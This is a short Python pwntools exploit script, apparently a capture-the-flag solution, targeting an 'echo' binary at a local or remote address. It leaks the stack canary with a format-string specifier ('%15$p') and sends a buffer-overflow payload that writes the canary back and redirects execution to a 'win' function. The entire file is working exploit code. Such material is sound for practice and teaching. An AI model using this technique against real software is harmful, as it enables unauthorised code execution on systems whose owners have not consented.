#!/usr/bin/env python3
from pwn import *

# exe = context.binary = ELF(args.EXE or '../src/a.out')
exe = context.binary = ELF(args.EXE or '../pub/echo')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

# io.sendlineafter(b"Can you redirect to win function",b"%19$p")
io.sendlineafter(b"Enter some text: ",b"%15$p")

io.recvline()
text = io.recvline(b"Enter some text: \n").strip()
canary= int(text, 16)

print("canary",hex(canary))

ret = 0x000000000040101a

payload =b"A"*72
payload+=p64(canary)
payload+= b"A"*8
payload+=p64(ret)
payload+=p64(exe.symbols.win)

print(payload)
io.sendlineafter(b"Do you have any reviews?",payload)
io.interactive()
